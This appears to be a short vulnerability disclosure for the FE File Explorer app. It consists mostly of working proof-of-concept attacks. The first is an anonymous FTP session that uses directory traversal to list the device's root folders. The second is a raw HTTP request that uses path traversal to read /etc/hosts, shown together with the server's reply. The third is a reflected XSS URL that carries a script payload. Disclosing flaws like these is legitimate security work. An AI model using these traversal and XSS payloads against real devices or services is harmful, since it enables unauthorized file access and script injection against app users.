# FE-File-Explorer
FE File Explorer Multi Vulnerabilities

Directory traversal:

connect to ftp as anynomous 

ftp> cd /../../../../../../../../../../../../../../../../
250 OK. Current directory is /../../../../../../../../../../../../../../../../
ftp> ls
200 PORT command successful.
150 Accepted data connection
total 10
drwxr-xr-x     0 root wheel        256 Jan 01 1970 usr
drwxr-xr-x     0 root wheel        128 Jan 01 1970 bin
drwxr-xr-x     0 root wheel        576 Jan 01 1970 sbin
drwxr-xr-x     0 root wheel        160 Jan 01 1970 System
drwxr-xr-x     0 root wheel        672 Jan 01 1970 Library
drwxr-xr-x     0 root wheel        224 Jan 01 1970 private
drwxr-xr-x     0 root wheel       1132 Jan 01 1970 dev
drwxr-xr-x     0 root admin       3968 Jan 01 1970 Applications
drwxr-xr-x     0 root admin         64 Jan 01 1970 Developer
drwxr-xr-x     0 root admin         64 Jan 01 1970 cores

local file inclusion (web) : 

GET /../../../../../../../../../../../../../../../../etc/hosts HTTP/1.1
Host: 192.168.1.178:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

---
HTTP/1.1 200 OK
Connection: Close
Server: GCDWebUploader
Content-Type: application/octet-stream
Last-Modified: Wed, 13 Jul 2022 10:35:46 GMT
Date: Tue, 06 Sep 2022 21:40:40 GMT
Content-Length: 213
Cache-Control: max-age=3600, public
Etag: 1152921500312311378/1657708546/0

##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1	localhost
255.255.255.255	broadcasthost
::1             localhost


reflected xss: 

http://192.168.1.178:8080/download?path=%3Cscript%3Ealert(%27rose%20taken%27);%3C/script%3E
